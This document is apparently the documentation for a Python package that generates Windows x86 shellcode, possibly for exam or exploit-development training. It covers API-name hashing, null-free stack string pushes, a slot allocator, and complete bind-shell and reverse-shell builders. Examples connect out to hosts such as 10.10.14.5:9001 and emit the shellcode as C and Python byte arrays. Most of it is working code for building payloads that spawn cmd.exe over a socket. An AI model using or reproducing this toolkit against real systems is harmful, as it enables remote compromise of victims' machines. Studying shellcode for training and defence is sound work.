# Documentation: `shellcode/` package

## Overview

The `shellcode/` directory is a Python package that exposes every building block from the shellcode scripts as an importable library. It can be imported from any Python script in the same directory tree without installing anything beyond Keystone.

`skeleton.py` is a thin CLI wrapper that imports the package. All logic lives in the package; `skeleton.py` owns only argument parsing and the Windows execution harness.

---

## Package layout

```
shellcode/
├── __init__.py     re-exports the full public API
├── hashing.py      hash algorithms (ror_hash, rolxor_hash, compute_hash)
├── encoding.py     network encoding and stack string builder
├── slots.py        SlotAllocator — EBP-relative function pointer slots
├── snippets.py     reusable assembly blocks (static constants + parameterized functions)
├── builders.py     resolve block builders and high-level mode builders
└── assembler.py    thin Keystone wrapper (assemble)
```

Keystone is only imported inside `assembler.py`. Everything else can be imported on any host — including Linux/macOS — for hashing, encoding, and assembly text generation.

---

## Installation / import

No install step is needed. Place the `shellcode/` directory next to any script and import normally:

```python
from shellcode import bindshell_code, assemble
```

All public symbols are re-exported from `shellcode/__init__.py`. Importing individual modules also works:

```python
from shellcode.hashing import ror_hash
from shellcode.encoding import stack_string_pushes
from shellcode.slots import SlotAllocator
```

---

## Module reference

### `shellcode.hashing`

Hash algorithms used by `find_function` to match export names.

```python
from shellcode.hashing import ror_hash, rolxor_hash, compute_hash, ALGOS, DEFAULT_ROTATION
```

#### `ror_hash(name: str, rotation: int = 13) -> int`

ROR-N + ADD per byte. The industry standard, defaulting to rotation 13. Equivalent to the assembly loop:

```asm
ror   edx, 0x0d
add   edx, eax
```

#### `rolxor_hash(name: str, rotation: int = 7) -> int`

ROL-N + XOR per byte. Metasploit variant, defaulting to rotation 7. Equivalent to:

```asm
rol   edx, 0x07
xor   edx, eax
```

#### `compute_hash(name: str, algo: str, rotation: int) -> int`

Dispatch by algorithm name. `algo` must be `'ror'` or `'rolxor'`.

#### `ALGOS: dict`

```python
{'ror': ror_hash, 'rolxor': rolxor_hash}
```

#### `DEFAULT_ROTATION: dict`

```python
{'ror': 13, 'rolxor': 7}
```

**Example:**

```python
from shellcode.hashing import ror_hash, compute_hash

print(hex(ror_hash('LoadLibraryA')))          # 0xec0e4e8e
print(hex(ror_hash('CreateProcessA')))        # 0x16b3fe72
print(hex(compute_hash('WSAStartup', 'ror', 13)))  # 0x3bfcedcb
```

---

### `shellcode.encoding`

Network value encoding and null-byte-safe stack string construction.

```python
from shellcode.encoding import encode_ip, encode_port, stack_string_pushes
```

#### `encode_ip(ip: str) -> tuple[int, bool]`

Converts a dotted-quad IPv4 address into a `(push_value, has_null)` pair.

`push_value` is the little-endian dword to use in `push <value>` so the four bytes land at `ESP` in network (big-endian) byte order, satisfying `sockaddr_in.sin_addr`.

`has_null` is `True` when any octet is zero — a null byte would appear in the instruction encoding.

```python
val, warn = encode_ip('192.168.45.174')
# val  = 0xae2da8c0
# warn = False
# push 0xae2da8c0 places bytes [c0, a8, 2d, ae] at ESP = 192.168.45.174
```

#### `encode_port(port: int) -> tuple[int, bool]`

Converts a port number into a `(mov_ax_value, has_null)` pair.

`mov_ax_value` is the byte-swapped port for use in `mov ax, <value>` followed by `shl eax, 0x10` and `add ax, 0x02`, which builds the `sin_port + sin_family` dword in network byte order.

```python
val, warn = encode_port(443)
# val  = 0xbb01   (443 = 0x01bb, swapped = 0xbb01)
# warn = False
```

Common exam ports and their encoded values:

| Port | Encoded (`mov ax`) | Null byte? |
|---|---|---|
| 443 | `0xbb01` | No |
| 1337 | `0x3905` | No |
| 4444 | `0x5c11` | No |
| 80 | `0x5000` | Yes — port 80 produces a null in the high byte |

#### `stack_string_pushes(s: str) -> list[str]`

Returns a list of x86 assembly instruction strings that build the null-terminated ASCII string `s` on the stack without null bytes in the instruction stream.

After executing the returned instructions, `ESP` points to the start of the string.

The string is padded to a 4-byte multiple then split into dword chunks and pushed in reverse order. Each chunk uses the minimal null-safe encoding:

| Pattern in chunk | Encoding |
|---|---|
| No null bytes | `push <dword>` |
| Two trailing nulls `[A, B, 0, 0]` | `xor eax,eax` / `mov ax, 0xBBAA` / `push eax` |
| Three trailing nulls `[A, 0, 0, 0]` | `xor eax,eax` / `mov al, 0xAA` / `push eax` |
| One trailing null `[A, B, C, 0]` | `xor`+3× `mov al`/`shl` sequence / `push eax` |
| Embedded null (non-trailing) | Warning comment emitted; push emitted as-is — requires manual fix |

```python
from shellcode.encoding import stack_string_pushes

for line in stack_string_pushes('ws2_32.dll'):
    print(line)
# xor eax, eax
# mov ax, 0x6c6c         # "ll  "
# push eax
# push 0x642e3233        # "32.d"
# push 0x5f327377        # "ws2_"
```

---

### `shellcode.slots`

```python
from shellcode.slots import SlotAllocator
```

#### `class SlotAllocator`

Tracks EBP-relative dword slots for saved function pointers. Eliminates manual offset tracking when resolving multiple functions.

`[ebp+0x04]` is permanently reserved by the call/pop thunk for `find_function`. User slots start at `[ebp+0x10]` and increment by 4.

**Constructor:**

```python
slots = SlotAllocator(start=0x10)  # default start
```

**Methods:**

| Method | Returns | Description |
|---|---|---|
| `alloc(name)` | `int` | Allocate a slot for `name`. Idempotent — returns existing offset if already allocated. |
| `slot(name)` | `int` | Look up offset for `name`. Raises `KeyError` if not allocated. |
| `hex_slot(name)` | `str` | Same as `slot` but returns a hex string like `'0x10'`. |
| `as_dict()` | `dict` | Copy of the full `name → offset` mapping. |
| `print_map()` | `None` | Print slot assignments to stdout. |

```python
slots = SlotAllocator()
slots.alloc('LoadLibraryA')    # returns 0x10
slots.alloc('CreateProcessA')  # returns 0x14
slots.alloc('LoadLibraryA')    # returns 0x10 again (idempotent)

slots.slot('CreateProcessA')   # 0x14
slots.hex_slot('LoadLibraryA') # '0x10'

slots.print_map()
# Slot map:
#   [ebp+0x04] = find_function  (reserved)
#   [ebp+0x10] = LoadLibraryA
#   [ebp+0x14] = CreateProcessA
```

---

### `shellcode.snippets`

Reusable assembly blocks. Import individually or via the top-level package.

```python
from shellcode.snippets import (
    SNIPPET_STARTUPINFOA_SOCKET,
    SNIPPET_STARTUPINFOA_NULL,
    SNIPPET_CMD_STRING,
    snippet_createprocessa,
    snippet_terminateprocess,
    snippet_wsa_init,
    snippet_wsa_socket_tcp,
    snippet_sockaddr_bind,
    snippet_bind_listen_accept,
    snippet_wsaconnect,
)
```

#### Register conventions

All snippets share these register contracts so they can be composed without conflicts:

| Register | Role |
|---|---|
| `ESI` | Socket handle — set before any `STARTUPINFOA` block |
| `EDI` | `STARTUPINFOA` pointer — set by `startupinfoa_*`, consumed by `createprocessa` |
| `EBX` | Command string pointer — set by `cmd_string`, consumed by `createprocessa` |

#### Static snippet constants

| Name | Description |
|---|---|
| `SNIPPET_STARTUPINFOA_SOCKET` | Build `STARTUPINFOA` on the stack with `ESI` as `hStdInput/Output/Error` (`dwFlags = STARTF_USESTDHANDLES`). Sets `EDI = &STARTUPINFOA`. Use for shells. |
| `SNIPPET_STARTUPINFOA_NULL` | Build zeroed `STARTUPINFOA` (`dwFlags = 0`, all handles NULL). Sets `EDI = &STARTUPINFOA`. Use for silent process launches. |
| `SNIPPET_CMD_STRING` | Push `"cmd.exe"` onto the stack using `neg eax` to avoid null bytes. Sets `EBX = "cmd.exe"`. |

#### Parameterized snippet functions

All return a string of assembly instructions.

##### `snippet_createprocessa(slot: int) -> str`

Call `CreateProcessA` to launch `EBX` (command string) with `EDI` (`STARTUPINFOA`) and `bInheritHandles = TRUE`. `slot` is the EBP offset where the `CreateProcessA` address was saved.

```python
asm = snippet_createprocessa(slots.slot('CreateProcessA'))
```

##### `snippet_terminateprocess(slot: int) -> str`

Call `TerminateProcess(0xFFFFFFFF, 0)` — terminates the calling process cleanly.

##### `snippet_wsa_init(slot: int) -> str`

Call `WSAStartup(0x0202, lpWSAData)`. The `WSADATA` buffer is placed at `ESP - 0x590`.

##### `snippet_wsa_socket_tcp(slot: int) -> str`

Call `WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0)`. Returns the socket descriptor in `EAX`. All literal constants are encoded without null bytes.

##### `snippet_sockaddr_bind(port: int) -> str`

Save `EAX` (socket from `WSASocketA`) into `ESI`, then build a `sockaddr_in` on the stack for `0.0.0.0:port`. After execution: `ESI` = socket, `EDI` = `&sockaddr_in`.

Emits a warning comment in the assembly if `port` would produce a null byte.

##### `snippet_bind_listen_accept(bind_slot, listen_slot, accept_slot) -> str`

Call `bind(ESI, EDI, 16)` → `listen(ESI, 0)` → `accept(ESI, NULL, NULL)`. After `accept` returns, `ESI` = accepted client socket handle.

##### `snippet_wsaconnect(lhost: str, lport: int, slot: int) -> str`

Save `EAX` (socket) into `ESI`, build `sockaddr_in` for `lhost:lport`, then call `WSAConnect`. Emits warning comments if either value would produce null bytes.

---

### `shellcode.builders`

High-level mode builders and lower-level resolve block builders.

```python
from shellcode.builders import (
    custom_code,
    bindshell_code,
    revshell_code,
    build_resolve_block,
    build_load_and_resolve,
    build_call_placeholder,
)
```

All mode builders return `(asm_string, SlotAllocator)`. Pass `asm_string` to `assemble()` or print it for inspection.

#### `custom_code(func_names, algo='ror', rotation=13)`

Resolve `func_names` from `kernel32.dll` and emit a `call_function` placeholder.

```python
code, slots = custom_code(['LoadLibraryA', 'VirtualAlloc'])
```

#### `bindshell_code(port, algo='ror', rotation=13)`

Complete TCP bind shell. Resolves from `kernel32`: `TerminateProcess`, `LoadLibraryA`, `CreateProcessA`. Loads `ws2_32.dll` and resolves: `WSAStartup`, `WSASocketA`, `bind`, `listen`, `accept`. Then emits the full socket setup, shell launch, and cleanup.

```python
code, slots = bindshell_code(4444)
```

#### `revshell_code(lhost, lport, algo='ror', rotation=13)`

Complete TCP reverse shell. Same kernel32 functions, then from `ws2_32.dll`: `WSAStartup`, `WSASocketA`, `WSAConnect`. Connects out to `lhost:lport` and spawns `cmd.exe` with I/O redirected to the socket.

```python
code, slots = revshell_code('10.10.14.5', 9001)
```

#### `build_resolve_block(func_names, algo, rotation, slots, label='resolve_symbols_kernel32')`

Lower-level: emit push/call/save triplets for each name. `EBX` must equal the target DLL base on entry. Allocates slots in `slots` as a side effect.

```python
slots = SlotAllocator()
block = build_resolve_block(
    ['TerminateProcess', 'LoadLibraryA'],
    algo='ror', rotation=13, slots=slots
)
```

#### `build_load_and_resolve(dll, func_names, algo, rotation, slots)`

Build the `LoadLibraryA("dll")` + resolve block for a second DLL. `LoadLibraryA` must already be in `slots`. After execution, `EBX` = loaded DLL base.

```python
block = build_load_and_resolve(
    'ntdll.dll', ['NtAllocateVirtualMemory'],
    algo='ror', rotation=13, slots=slots
)
```

#### `build_call_placeholder(func_names, slots)`

Emit a commented `call_function:` block listing all resolved slots, with the first function as the default call target.

---

### `shellcode.assembler`

```python
from shellcode.assembler import assemble
```

#### `assemble(code: str) -> tuple[bytearray, int]`

Assemble `code` using Keystone x86-32. Returns `(shellcode_bytearray, instruction_count)`.

Exits with an error message on assembly failure. Importing this module does not require Keystone unless `assemble()` is actually called.

```python
from shellcode import bindshell_code, assemble

code, slots = bindshell_code(4444)
shellcode, count = assemble(code)
print(f'{count} instructions, {len(shellcode)} bytes')
print(''.join(f'\\x{b:02x}' for b in shellcode))
```

---

## Common usage patterns

### Compute hashes offline

```python
from shellcode.hashing import ror_hash

functions = ['LoadLibraryA', 'CreateProcessA', 'TerminateProcess',
             'WSAStartup', 'WSASocketA', 'bind', 'listen', 'accept']

for f in functions:
    print(f'{f:<30} {hex(ror_hash(f))}')
```

### Generate stack push instructions for any string

```python
from shellcode.encoding import stack_string_pushes

for line in stack_string_pushes('ntdll.dll'):
    print(f'    {line}')
print('    push  esp')
```

### Build a custom payload from parts

```python
from shellcode import assemble
from shellcode.hashing import compute_hash
from shellcode.slots import SlotAllocator
from shellcode.builders import (
    build_resolve_block,
    build_load_and_resolve,
    _PROLOGUE, _FIND_KERNEL32, _FIND_FUNCTION_THUNK,
)
from shellcode.builders import _find_function_asm   # internal, but accessible

algo, rot = 'ror', 13
slots = SlotAllocator()

sections = [
    _PROLOGUE,
    _FIND_KERNEL32,
    _FIND_FUNCTION_THUNK,
    _find_function_asm(algo, rot),
    build_resolve_block(['LoadLibraryA', 'VirtualAlloc', 'CreateThread'], algo, rot, slots),
    # ... custom payload assembly here ...
]

code = '\n'.join(sections)
shellcode, count = assemble(code)
```

### Generate shellcode bytes for use in another tool

```python
from shellcode import revshell_code, assemble

code, slots = revshell_code('192.168.1.50', 4444, algo='rolxor')
shellcode, _ = assemble(code)

# as a C array
c_array = ', '.join(f'0x{b:02x}' for b in shellcode)
print(f'unsigned char buf[] = {{{c_array}}};')

# as a Python bytes literal
py_bytes = 'b"' + ''.join(f'\\x{b:02x}' for b in shellcode) + '"'
print(py_bytes)
```

### Inspect assembly before assembling

```python
from shellcode import bindshell_code

code, slots = bindshell_code(1337)
slots.print_map()
print(code)
```

### Mix algorithms for testing collision avoidance

```python
from shellcode.hashing import ror_hash, rolxor_hash

targets = ['LoadLibraryA', 'LoadLibraryW', 'LoadLibraryExA', 'LoadLibraryExW']

print('Function              ROR-13       ROL-7+XOR')
for t in targets:
    print(f'{t:<22} {hex(ror_hash(t)):<12} {hex(rolxor_hash(t))}')
```

---

## Relationship between `skeleton.py` and `shellcode/`

`skeleton.py` is a command-line driver. It:

- Parses arguments with `argparse`
- Calls the appropriate mode builder from `shellcode.builders`
- Calls `shellcode.assembler.assemble` for assembly
- Runs the Windows execution harness (`VirtualAlloc` / `CreateThread`) on Windows

The `shellcode/` package has no knowledge of the CLI. You can use the library without `skeleton.py`, and `skeleton.py` can be replaced with any other driver without touching the library.


```
skeleton.py  ──imports──>  shellcode/
                               ├── hashing.py
                               ├── encoding.py
                               ├── slots.py
                               ├── snippets.py
                               ├── builders.py   <── depends on encoding, slots, snippets, hashing
                               └── assembler.py  <── depends on keystone only
```

---

## Extending the library

### Adding a new hash algorithm

1. Add the Python function to `hashing.py`
2. Add it to `ALGOS` and `DEFAULT_ROTATION`
3. Handle the new name in `_find_function_asm` in `builders.py` (add an `elif` for the assembly inner loop)
4. Add it to the `--algo` choices in `skeleton.py`

### Adding a new snippet

Add a function or constant to `snippets.py` following the register conventions (document `ESI`/`EDI`/`EBX` usage). Export it from `__init__.py` and add an entry to `SNIPPET_DOCS` in `skeleton.py` if CLI listing is desired.

### Adding a new mode

Add a function to `builders.py` following the `custom_code` / `bindshell_code` pattern: create a `SlotAllocator`, build a sections list, return `('\n'.join(sections), slots)`. Wire it into `skeleton.py`'s `--mode` choices.
